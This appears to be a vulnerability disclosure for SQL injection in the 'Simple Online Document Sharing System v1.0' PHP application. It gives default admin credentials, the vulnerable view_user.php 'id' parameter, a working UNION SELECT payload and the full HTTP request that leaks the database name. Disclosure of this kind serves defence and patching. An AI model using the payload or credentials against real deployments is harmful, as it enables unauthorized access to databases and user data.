# Simple Online Document Sharing System v1.0 by sourcecodester has SQL injection 1

BUG_Author: wangxinyu

Login account: admin@admin.com/admin123

vendors: https://www.sourcecodester.com/php/14592/simple-online-document-sharing-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /document_sharing/view_user.php

Vulnerability location: /document_sharing/view_user.php?id=, id

dbname = odss_db

[+] Payload: /document_sharing/view_user.php?id=-1%20union%20select%201,2,3,4,5,6,database(),8,9,10,11,12--+ // Leak place ---> id

```sql
GET /document_sharing/view_user.php?id=-1%20union%20select%201,2,3,4,5,6,database(),8,9,10,11,12--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close


```

<img width="1240" height="747" alt="image" src="https://github.com/user-attachments/assets/95b45085-b5fc-4106-87c5-431b29f3fe00" />
